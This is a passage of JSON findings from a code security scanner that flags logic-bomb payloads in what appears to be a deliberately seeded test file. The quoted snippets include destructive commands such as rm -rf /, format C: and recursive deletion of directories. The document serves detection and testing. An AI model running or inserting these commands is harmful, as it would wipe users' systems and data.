    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T20:51:09.556770"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "shutil.rmtree('/important_data')",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.560764",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "test_suspicious.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
    "id": "4f50a357-9a58-4a4b-8263-7cdfc0b1b6b3",
    "last_modified": "",
    "line_number": 12,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T20:51:09.560764"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "os.system('format C:')",
    "column": 8,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.560764",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "test_suspicious.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
    "id": "77e9572f-e911-4057-977d-afb3d918f70c",
    "last_modified": "",
    "line_number": 13,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "System formatting - Complete data destruction",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T20:51:09.560764"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "subprocess.call(['rm', '-rf', '/'])",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.560764",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "test_suspicious.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
    "id": "39cf236a-70d3-4523-bba3-e077d1d2f388",
    "last_modified": "",
    "line_number": 14,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T20:51:09.560764"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "os.remove('/critical_file.txt')",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.560764",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "test_suspicious.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
    "id": "ee7dac21-73a9-455d-8a13-dc6a23d89cc9",
    "last_modified": "",
    "line_number": 28,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "File/directory deletion - Data loss risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T20:51:09.560764"
  }
]